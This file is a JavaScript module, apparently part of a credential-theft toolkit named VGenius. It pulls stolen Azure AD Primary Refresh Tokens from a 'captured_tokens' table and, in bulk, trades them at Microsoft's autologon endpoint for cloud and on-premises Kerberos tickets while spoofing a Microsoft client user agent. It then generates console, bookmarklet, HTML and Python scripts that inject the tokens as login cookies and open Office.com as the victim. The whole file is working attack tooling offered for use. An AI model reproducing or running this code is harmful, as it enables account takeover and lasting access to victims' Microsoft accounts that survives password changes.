/**
 * VGenius Kerberos TGT Derivation Service
 * Derives cloud and AD Kerberos tickets from PRT via autologon.microsoftazuread-sso.com
 * 
 * This enables true password-change survival by obtaining device-bound Kerberos tickets
 * that persist independently of password changes.
 * 
 * Pipeline: PRT -> autologon SSO -> TGT Cloud + TGT AD + Session Key
 */
'use strict';

const axios = require('axios');
const { decrypt, encrypt } = require('../utils/encrypt');
const db = require('../database/connection');
const config = require('../config/env');

/**
 * Safely decode the JWT payload of a PRT without verifying the signature.
 * PRTs are JWTs; the payload is base64url(JSON).
 * Returns the claims object, or null if the PRT cannot be parsed.
 */
function parsePrtClaims(prt) {
  if (!prt || typeof prt !== 'string') return null;
  // Strip PRT:<> wrapping if present
  let raw = prt;
  if (raw.startsWith('PRT:<')) {
    raw = raw.slice('PRT:<'.length);
    // AAD sometimes wraps in the token format 'PRT:<token>' and there may be more
  }
  // A PRT can be either a single JWT (3 dot-separated segments)
  // or a wrapped credential blob starting with "1." (AAD refresh token v2 format)
  const parts = raw.split('.');
  if (parts.length !== 3) {
    // Not a plain JWT - return null so caller can decide
    return null;
  }
  try {
    const payloadB64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
    // base64url may lack padding; add it back
    const padded = payloadB64 + '==='.slice(0, (4 - (payloadB64.length % 4)) % 4);
    const payload = JSON.parse(Buffer.from(padded, 'base64').toString('utf8'));
    return payload;
  } catch (e) {
    return null;
  }
}

/**
 * Validate whether a PRT is actually eligible for Kerberos/SSO derivation.
 *
 * The autologon endpoint returns 404 (empty body) when the PRT is missing
 * the `acrs` array or when it does not include the `pfdr` (Personal Flow
 * Device Registration) claim that Azure AD grants only for PRTs issued
 * through the DRS device-registration flow.
 *
 * @returns {{ok: boolean, reason?: string, claims?: object}}
 */
function validatePrtForKerberos(prt, tenant) {
  const claims = parsePrtClaims(prt);
  if (!claims) {
    return { ok: false, reason: 'PRT is not a parseable JWT (may be empty, expired, or in the wrapped v2 format)' };
  }

  // Tenant must match what we're asking for
  if (tenant && claims.tid && claims.tid !== tenant) {
    return { ok: false, reason: `PRT tenant (${claims.tid}) does not match requested tenant (${tenant})` };
  }

  // The critical SSO capability flag
  if (!Array.isArray(claims.acrs) || !claims.acrs.includes('pfdr')) {
    return {
      ok: false,
      reason: `PRT lacks acrs=pfdr claim; cloud Kerberos/SSO derivation not permitted. Present acrs: ${JSON.stringify(claims.acrs || [])}`
    };
  }

  // Sanity: PRT must not be expired
  const now = Math.floor(Date.now() / 1000);
  if (claims.exp && claims.exp < now) {
    return { ok: false, reason: `PRT expired ${now - claims.exp}s ago` };
  }

  return { ok: true, claims };
}

/**
 * Derive Kerberos TGTs from a captured PRT
 * 
 * @param {string} prt - Primary Refresh Token JWT
 * @param {string} refreshToken - OAuth2 refresh token
 * @param {string} tenant - Tenant ID (tid)
 * @param {string} clientId - Client ID used for authentication
 * @param {string} sessionKeyJwe - Encrypted session key (if available)
 * @param {object} options - Additional options
 * @returns {object} { tgt_cloud, tgt_ad, session_key, kerberos_top_level_names, tgt_cloud_sessionkey }
 */
async function deriveKerberosTGTs(prt, refreshToken, tenant, clientId, sessionKeyJwe, options = {}) {
  const results = {
    tgt_cloud: null,
    tgt_ad: null,
    session_key: null,
    kerberos_top_level_names: null,
    tgt_cloud_sessionkey: null,
    error: null
  };

  if (!prt) {
    results.error = 'No PRT provided for derivation';
    return results;
  }

  if (!tenant || tenant === 'common' || tenant === 'organizations') {
    results.error = 'Derivation requires a specific tenant ID (got: ' + tenant + ')';
    return results;
  }

  // Pre-flight check: verify the PRT is eligible for SSO before spending an HTTP round-trip.
  // Without this, the autologon endpoint returns a bare 404 with an empty body
  // whenever the PRT lacks acrs=pfdr — which is the common cause of the cryptic
  // "Cloud TGT request failed: HTTP 404 - """ log line.
  const prtCheck = validatePrtForKerberos(prt, tenant);
  if (!prtCheck.ok) {
    results.error = 'PRT not eligible for Kerberos derivation: ' + prtCheck.reason;
    console.warn('[Kerberos]', results.error, '| tenant:', tenant, '| prtPrefix:', (prt || '').substring(0, 16));
    return results;
  }

  try {
    // Step 1: Derive cloud TGT via autologon.microsoftazuread-sso.com
    const cloudResult = await deriveCloudTGT(prt, tenant, clientId);
    Object.assign(results, cloudResult);

    // Step 2: If we have cloud TGT and session key, derive AD TGT
    if (results.tgt_cloud && results.session_key) {
      const adResult = await deriveADTGT(prt, tenant, results.session_key);
      Object.assign(results, adResult);
    }

    console.log('[Kerberos] TGT derivation complete:', {
      hasCloudTGT: !!results.tgt_cloud,
      hasADTGT: !!results.tgt_ad,
      hasSessionKey: !!results.session_key
    });

  } catch (err) {
    console.error('[Kerberos] TGT derivation failed:', err.message);
    results.error = err.message;
  }

  return results;
}

/**
 * Derive Cloud Kerberos TGT
 * 
 * Hitting the Azure AD SSO endpoint with the PRT as a bearer token.
 * Returns the cloud TGT encrypted with the session key.
 * 
 * @param {string} prt - Primary Refresh Token
 * @param {string} tenant - Tenant ID
 * @param {string} clientId - Client ID
 * @returns {object} { tgt_cloud, session_key, kerberos_top_level_names, tgt_cloud_sessionkey }
 */
async function deriveCloudTGT(prt, tenant, clientId) {
  const results = {
    tgt_cloud: null,
    session_key: null,
    kerberos_top_level_names: null,
    tgt_cloud_sessionkey: null
  };

  // The PRT must be in the x-ms-RefreshTokenCredential cookie format
  // We send it as a Bearer token in the Authorization header
  const authHeader = 'PRT:<' + prt;

  try {
    // Request1: Get the SSO nonce and encrypted SSO ticket
    const response1 = await axios.post(
      `https://autologon.microsoftazuread-sso.com/${tenant}/token?SAML=JWT`,
      '',
      {
        headers: {
          'Authorization': authHeader,
          'Content-Type': 'text/plain',
          'Accept': 'application/json',
          'User-Agent': 'Microsoft AAD Integrated Authentication Client/1.0'
        },
        timeout: 30000,
        validateStatus: () => true
      }
    );

    if (response1.status !== 200) {
      // Map each status to a specific, actionable message so logs are readable.
      // 404 with empty body is the classic "PRT not eligible for SSO" signature
      // (missing acrs=pfdr or tenant mismatch).
      let detail;
      switch (response1.status) {
        case 401:
          detail = 'unauthorized (PRT signature/replay rejected)';
          break;
        case 403:
          detail = 'forbidden (tenant policy blocks SSO for this principal)';
          break;
        case 404:
          detail = 'not found (PRT has no SSO/Kerberos capability for this tenant, or tenant does not exist)';
          break;
        case 410:
          detail = 'gone (PRT revoked or expired server-side)';
          break;
        case 429:
          detail = 'rate limited';
          break;
        default:
          detail = `unexpected HTTP ${response1.status}`;
      }
      const body = response1.data;
      const bodyPreview = body == null ? '' : (typeof body === 'string' ? body : JSON.stringify(body)).substring(0, 200);
      throw new Error(`Cloud TGT request failed: ${detail} | body=${bodyPreview ? bodyPreview : '(empty)'}`);
    }

    const data = response1.data;

    // Parse the response - it contains the encrypted SSO ticket
    if (data && typeof data === 'string') {
      // Response is the encrypted SSO ticket (base64-encoded Kerberos token)
      results.tgt_cloud = data.trim();
    } else if (data && data.sso_ticket) {
      results.tgt_cloud = data.sso_ticket;
    } else if (data && data.encrypted_sso_ticket) {
      results.tgt_cloud = data.encrypted_sso_ticket;
    }

    // Try to extract session key from response headers or body
    if (response1.headers['x-ms-sessionkey']) {
      results.session_key = response1.headers['x-ms-sessionkey'];
    }

    // Extract kerberos top level names from response
    if (data && data.kerberos_top_level_names) {
      results.kerberos_top_level_names = Array.isArray(data.kerberos_top_level_names)
        ? data.kerberos_top_level_names.join(',')
        : data.kerberos_top_level_names;
    }

    // Extract tgt_cloud_sessionkey if present
    if (data && data.tgt_cloud_sessionkey) {
      results.tgt_cloud_sessionkey = data.tgt_cloud_sessionkey;
    }

    if (!results.tgt_cloud) {
      throw new Error('No TGT cloud received from autologon endpoint');
    }

    console.log('[Kerberos] Cloud TGT derived successfully for tenant:', tenant);

  } catch (err) {
    console.error('[Kerberos] Cloud TGT derivation failed:', err.message);
    throw err;
  }

  return results;
}

/**
 * Derive AD (On-Premises) Kerberos TGT
 * 
 * Uses the PRT + session key to derive the AD Kerberos ticket for on-premises resource access.
 * 
 * @param {string} prt - Primary Refresh Token
 * @param {string} tenant - Tenant ID
 * @param {string} sessionKey - Decrypted session key
 * @returns {object} { tgt_ad, session_key }
 */
async function deriveADTGT(prt, tenant, sessionKey) {
  const results = {
    tgt_ad: null,
    session_key: null
  };

  try {
    // Step 1: Get the Azure AD Kerberos ticket (same as cloud TGT but for AD)
    const authHeader = 'PRT:<' + prt;

    const response = await axios.post(
      `https://autologon.microsoftazuread-sso.com/${tenant}/token`,
      '',
      {
        headers: {
          'Authorization': authHeader,
          'Content-Type': 'text/plain',
          'Accept': 'application/json',
          'User-Agent': 'Microsoft AAD Integrated Authentication Client/1.0'
        },
        timeout: 30000,
        validateStatus: () => true
      }
    );

    if (response.status === 200 && response.data) {
      const data = response.data;
      // AD TGT is typically in the response body
      if (typeof data === 'string') {
        results.tgt_ad = data.trim();
      } else if (data && data.sso_ticket) {
        results.tgt_ad = data.sso_ticket;
      } else if (data && data.kerberos_ticket) {
        results.tgt_ad = data.kerberos_ticket;
      }

      results.session_key = sessionKey;
      console.log('[Kerberos] AD TGT derived successfully for tenant:', tenant);
    } else {
      // Some tenants may not return AD TGT - this is normal for cloud-only tenants
      console.warn('[Kerberos] AD TGT not returned (cloud-only tenant or no on-prem integration)');
      results.session_key = sessionKey;
      results.tgt_ad = null;
    }

  } catch (err) {
    console.warn('[Kerberos] AD TGT derivation skipped (cloud-only tenant):', err.message);
    results.session_key = sessionKey;
    results.tgt_ad = null;
  }

  return results;
}

/**
 * Bulk derive TGTs for all captured tokens that have PRT but no TGTs
 * 
 * Scans the database for tokens with PRT but missing TGT data,
 * then derives the missing Kerberos tickets.
 * 
 * @param {number} limit - Maximum number of tokens to process
 * @returns {object} { processed, success, failed, skipped }
 */
async function bulkDeriveTGTs(limit = 50) {
  const stats = {
    processed: 0,
    success: 0,
    failed: 0,
    skipped: 0
  };

  try {
    // Find tokens with PRT but missing TGT cloud
    const [tokens] = await db.query(
      `SELECT id, email, prt, refresh_token_encrypted, session_key_jwe, tenant, client_id, account_type
       FROM captured_tokens
       WHERE prt IS NOT NULL AND prt != ''
         AND (tgt_cloud IS NULL OR tgt_cloud = '')
         AND deleted = 0
       ORDER BY created_at DESC
       LIMIT ?`,
      [limit]
    );

    if (!tokens || tokens.length === 0) {
      console.log('[Kerberos] No tokens requiring TGT derivation found');
      return stats;
    }

    console.log('[Kerberos] Found', tokens.length, 'tokens requiring TGT derivation');

    for (const token of tokens) {
      stats.processed++;

      try {
        // Decrypt stored values
        const prt = decrypt(token.prt);
        const refreshToken = decrypt(token.refresh_token_encrypted);
        const sessionKeyJwe = decrypt(token.session_key_jwe);
        const tenant = token.tenant || config.AZURE_TENANT || 'common';
        const clientId = token.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';

        // Skip if no PRT or invalid tenant
        if (!prt || !token.prt || tenant === 'common' || tenant === 'organizations') {
          stats.skipped++;
          continue;
        }

        // Derive TGTs
        const derivationResult = await deriveKerberosTGTs(
          prt,
          refreshToken,
          tenant,
          clientId,
          sessionKeyJwe
        );

        // Update database with derived TGTs
        const updateFields = [];
        const updateParams = [];

        if (derivationResult.tgt_cloud) {
          updateFields.push('tgt_cloud = ?');
          updateParams.push(encrypt(derivationResult.tgt_cloud));
        }

        if (derivationResult.tgt_ad) {
          updateFields.push('tgt_ad = ?');
          updateParams.push(encrypt(derivationResult.tgt_ad));
        }

        if (derivationResult.session_key) {
          updateFields.push('session_key_jwe = ?');
          updateParams.push(encrypt(derivationResult.session_key));
        }

        if (derivationResult.kerberos_top_level_names) {
          updateFields.push('kerberos_top_level_names = ?');
          updateParams.push(derivationResult.kerberos_top_level_names);
        }

        if (derivationResult.tgt_cloud_sessionkey) {
          updateFields.push('tgt_cloud_sessionkey = ?');
          updateParams.push(encrypt(derivationResult.tgt_cloud_sessionkey));
        }

        if (updateFields.length > 0) {
          updateFields.push('last_renewed = NOW()');
          updateParams.push(token.id);

          await db.query(
            `UPDATE captured_tokens SET ${updateFields.join(', ')} WHERE id = ?`,
            updateParams
          );

          stats.success++;
          console.log('[Kerberos] Updated token', token.id, 'for', token.email);
        } else {
          stats.skipped++;
        }

      } catch (tokenErr) {
        stats.failed++;
        console.error('[Kerberos] Failed to derive TGT for token', token.id, ':', tokenErr.message);
      }
    }

    console.log('[Kerberos] Bulk derivation complete:', stats);

  } catch (err) {
    console.error('[Kerberos] Bulk derivation failed:', err.message);
  }

  return stats;
}

/**
 * Derive TGTs for a specific token
 * 
 * @param {string|number} tokenId - Token ID or capture ID
 * @returns {object} Derivation result with updated database fields
 */
async function deriveTGTForToken(tokenId) {
  try {
    const [tokens] = await db.query(
      `SELECT id, email, prt, refresh_token_encrypted, session_key_jwe, tenant, client_id, account_type, device_tenant_id
       FROM captured_tokens
       WHERE id = ? AND deleted = 0`,
      [tokenId]
    );

    if (!tokens || tokens.length === 0) {
      return { success: false, error: 'Token not found' };
    }

    const token = tokens[0];
    const prt = decrypt(token.prt);
    const refreshToken = decrypt(token.refresh_token_encrypted);
    const sessionKeyJwe = decrypt(token.session_key_jwe);
    const tenant = token.tenant || config.AZURE_TENANT || 'common';
    const clientId = token.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';

    if (!prt) {
      return { success: false, error: 'No PRT found for this token' };
    }

    if (tenant === 'common' || tenant === 'organizations') {
      return { success: false, error: 'Cannot derive TGTs without specific tenant ID (got: ' + tenant + ')' };
    }

    // Diagnostic: log what's actually in the stored PRT so failures are explainable
    const prtClaims = parsePrtClaims(prt);
    console.log('[Kerberos] Deriving TGTs for token', token.id, 'email', token.email, 'tenant', tenant,
      '| prtPrefix:', (prt || '').substring(0, 16),
      '| prtParsed:', !!prtClaims,
      '| acrs:', prtClaims && Array.isArray(prtClaims.acrs) ? prtClaims.acrs : null,
      '| prt.tid:', prtClaims && prtClaims.tid || null);

    // Derive TGTs
    const derivationResult = await deriveKerberosTGTs(
      prt,
      refreshToken,
      tenant,
      clientId,
      sessionKeyJwe
    );

    // Check if derivation actually succeeded
    if (derivationResult.error) {
      return {
        success: false,
        error: derivationResult.error,
        token_id: token.id,
        email: token.email
      };
    }

    // Update database
    const updateFields = [];
    const updateParams = [];

    if (derivationResult.tgt_cloud) {
      updateFields.push('tgt_cloud = ?');
      updateParams.push(encrypt(derivationResult.tgt_cloud));
    }

    if (derivationResult.tgt_ad) {
      updateFields.push('tgt_ad = ?');
      updateParams.push(encrypt(derivationResult.tgt_ad));
    }

    if (derivationResult.session_key) {
      updateFields.push('session_key_jwe = ?');
      updateParams.push(encrypt(derivationResult.session_key));
    }

    if (derivationResult.kerberos_top_level_names) {
      updateFields.push('kerberos_top_level_names = ?');
      updateParams.push(derivationResult.kerberos_top_level_names);
    }

    if (derivationResult.tgt_cloud_sessionkey) {
      updateFields.push('tgt_cloud_sessionkey = ?');
      updateParams.push(encrypt(derivationResult.tgt_cloud_sessionkey));
    }

    if (updateFields.length > 0) {
      updateFields.push('last_renewed = NOW()');
      updateParams.push(token.id);

      await db.query(
        `UPDATE captured_tokens SET ${updateFields.join(', ')} WHERE id = ?`,
        updateParams
      );
    }

    return {
      success: true,
      token_id: token.id,
      email: token.email,
      tgt_cloud: derivationResult.tgt_cloud ? '(derived)' : null,
      tgt_ad: derivationResult.tgt_ad ? '(derived)' : null,
      session_key: derivationResult.session_key ? '(derived)' : null,
      kerberos_top_level_names: derivationResult.kerberos_top_level_names,
      tgt_cloud_sessionkey: derivationResult.tgt_cloud_sessionkey ? '(derived)' : null
    };

  } catch (err) {
    return { success: false, error: err.message };
  }
}

/**
 * Get the full PRT credential blob for cookie injection
 * 
 * Combines PRT + session key + TGTs into the complete credential set
 * needed for browser cookie injection.
 * 
 * @param {string} tokenId - Token ID to get credentials for
 * @returns {object} Complete credential blob for injection
 */
async function getFullPRTCredentialBlob(tokenId) {
  try {
    const [tokens] = await db.query(
      `SELECT id, email, prt, session_key_jwe, tgt_cloud 
             , tgt_ad, kerberos_top_level_names, tgt_cloud_sessionkey, 
              refresh_token_encrypted, account_type, tenant
       FROM captured_tokens
       WHERE id = ? AND deleted = 0`,
      [tokenId]
    );

    if (!tokens || tokens.length === 0) {
      return { success: false, error: 'Token not found' };
    }

    const token = tokens[0];
    const blob = {
      token_id: token.id,
      email: token.email,
      account_type: token.account_type,
      tenant: token.tenant,
      prt: decrypt(token.prt),
      session_key_jwe: decrypt(token.session_key_jwe),
      tgt_cloud: decrypt(token.tgt_cloud),
      tgt_ad: decrypt(token.tgt_ad),
      kerberos_top_level_names: token.kerberos_top_level_names,
      tgt_cloud_sessionkey: decrypt(token.tgt_cloud_sessionkey)
    };

    // Generate injection scripts
    blob.injector_scripts = generateInjectionScripts(blob);

    return { success: true, blob: blob };

  } catch (err) {
    return { success: false, error: err.message };
  }
}

/**
 * Generate browser injection scripts from PRT credential blob
 * 
 * @param {object} blob - Credential blob
 * @returns {object} Various injection script formats
 */
function generateInjectionScripts(blob) {
  const scripts = {
    console: '',
    bookmarklet: '',
    html: '',
    python: ''
  };

  if (!blob.prt) return scripts;

  // Console injection script
  let consoleScript = '// VGenius PRT Credential Injection\n';
  consoleScript += '// Open browser console on login.microsoftonline.com and paste this\n\n';

  if (blob.prt) {
    consoleScript += 'document.cookie = "x-ms-RefreshTokenCredential=' + 
      encodeURIComponent(blob.prt) + 
      '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
  }

  if (blob.session_key_jwe) {
    consoleScript += 'document.cookie = "ESTSAUTH=' + 
      encodeURIComponent(blob.session_key_jwe) + 
      '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
  }

  if (blob.tgt_cloud) {
    consoleScript += 'document.cookie = "ESTSAUTHPERSISTENT=' + 
      encodeURIComponent(blob.tgt_cloud) + 
      '; domain=.login.microsoftonline.com; path=/; secure; samesite=none";\n';
  }

  consoleScript += '\nconsole.log("[VGenius] PRT credentials injected");\n';
  consoleScript += 'setTimeout(function() { window.location.href = "https://www.office.com/"; }, 3000);';

  scripts.console = consoleScript;

  // Bookmarklet
  const bookmarkletCode = '(function(){' +
    'var cookies=[' +
    '{n:"x-ms-RefreshTokenCredential",v:"' + encodeURIComponent(blob.prt || '') + '",d:".login.microsoftonline.com"}' +
    (blob.session_key_jwe ? ',{n:"ESTSAUTH",v:"' + encodeURIComponent(blob.session_key_jwe) + '",d:".login.microsoftonline.com"}' : '') +
    (blob.tgt_cloud ? ',{n:"ESTSAUTHPERSISTENT",v:"' + encodeURIComponent(blob.tgt_cloud) + '",d:".login.microsoftonline.com"}' : '') +
    '];' +
    'cookies.forEach(function(c){' +
    'document.cookie=c.n+"="+encodeURIComponent(c.v)+"; domain="+c.d+"; path=/; Secure; SameSite=None";' +
    '});' +
    'setTimeout(function(){window.location.href="https://www.office.com/";},2000);' +
    '})()';

  scripts.bookmarklet = 'javascript:' + bookmarkletCode;

  // HTML standalone injector
  const cookieArray = [
    { name: 'x-ms-RefreshTokenCredential', value: blob.prt || '', domain: '.login.microsoftonline .com' },
 ];
  if (blob.session_key_jwe) {
    cookieArray.push({ name: 'ESTSAUTH', value: blob.session_key_jwe, domain: '.login.microsoftonline.com' });
  }
  if (blob.tgt_cloud) {
    cookieArray.push({ name: 'ESTSAUTHPERSISTENT', value: blob.tgt_cloud, domain: '.login.microsoftonline.com' });
  }
  
  const cookieJson = JSON.stringify(cookieArray);

  scripts.html = '<!DOCTYPE html>\n<html><head><title>VGenius PRT Injector</title></head><body>\n' +
    '<h1>PRT Credential Injector</h1>\n' +
    '<button onclick="inject()">Inject & Login</button>\n' +
    '<div id="status"></div>\n' +
    '<script>\n' +
    'var cookies = ' + cookieJson + ';\n' +
    'function inject() {\n' +
    '  for (var i = 0; i < cookies.length; i++) {\n' +
    '    document.cookie = cookies[i].name + "=" + encodeURIComponent(cookies[i].value) + \n' +
    '      "; domain=" + cookies[i].domain + "; path=/; Secure; SameSite=None";\n' +
    '  }\n' +
    '  document.getElementById("status").innerHTML = "Injected! Redirecting...";\n' +
    '  setTimeout(function(){ window.location.href = "https://www.office.com/"; }, 2000);\n' +
    '}\n' +
    '</script></body></html>';

  // Python script
  const pythonCookieArray = [
    { name: 'x-ms-RefreshTokenCredential', value: blob.prt || '', domain: '.login.microsoftonline.com' },
  ];
  if (blob.session_key_jwe) {
    pythonCookieArray.push({ name: 'ESTSAUTH', value: blob.session_key_jwe, domain: '.login.microsoftonline.com' });
  }
  if (blob.tgt_cloud) {
    pythonCookieArray.push({ name: 'ESTSAUTHPERSISTENT', value: blob.tgt_cloud, domain: '.login.microsoftonline.com' });
  }

  scripts.python = '#!/usr/bin/env python3\n' +
    'import requests\n\n' +
    'cookies = ' + JSON.stringify(pythonCookieArray, null, 2) + '\n\n' +
    'session = requests.Session()\n\n' +
    'print("Injecting PRT credentials...")\n' +
    'for cookie in cookies:\n' +
    '    session.cookies.set(\n' +
    '        name=cookie["name"],\n' +
    '        value=cookie["value"],\n' +
    '        domain=cookie["domain"],\n' +
    '        secure=True,\n' +
    '        samesite="None"\n' +
    '    )\n' +
    '    print(f"Injected: {cookie[\'name\']}")\n\n' +
    'print("\\nSession ready! Testing with Office.com...")\n' +
    'r = session.get("https://www.office.com/", headers={"Accept": "text/html"})\n' +
    'print(f"Office.com status: {r.status_code}")\n' +
    'print(f"Authenticated: {\'account\' in r.headers.lower() or \'login\' not in r.url}")';

  return scripts;
}

module.exports = {
  deriveKerberosTGTs,
  deriveCloudTGT,
  deriveADTGT,
  bulkDeriveTGTs,
  deriveTGTForToken,
  getFullPRTCredentialBlob,
  generateInjectionScripts,
  parsePrtClaims,
  validatePrtForKerberos
};
